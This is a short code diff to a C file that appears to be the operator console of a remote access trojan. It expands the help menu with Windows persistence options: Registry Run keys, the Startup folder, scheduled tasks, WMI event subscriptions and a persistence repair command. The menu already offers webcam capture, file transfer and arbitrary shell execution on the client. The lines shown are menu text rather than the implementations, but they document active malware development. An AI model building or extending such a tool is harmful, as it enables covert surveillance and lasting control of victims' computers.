@@ -312,7 +312,12 @@ void handle_client_command(int client_id, char *cmd)
         printf("  webcam          - Capture webcam frame\n");
         printf("  upload <file>   - Upload file to client\n");
         printf("  download <file> - Download file from client\n");
-        printf("  persist         - Add persistence\n");
+        printf("  persist         - Install all persistence mechanisms\n");
+        printf("  persist:registry- Registry Run keys (HKCU + HKLM if admin)\n");
+        printf("  persist:startup - Copy to Startup folder\n");
+        printf("  persist:task    - Create scheduled tasks\n");
+        printf("  persist:wmi     - WMI event subscription\n");
+        printf("  persist:check   - Verify & repair persistence\n");
         printf("  cd <dir>        - Change directory\n");
         printf("  <any command>   - Execute shell command\n");
         printf("  q               - Disconnect client\n");
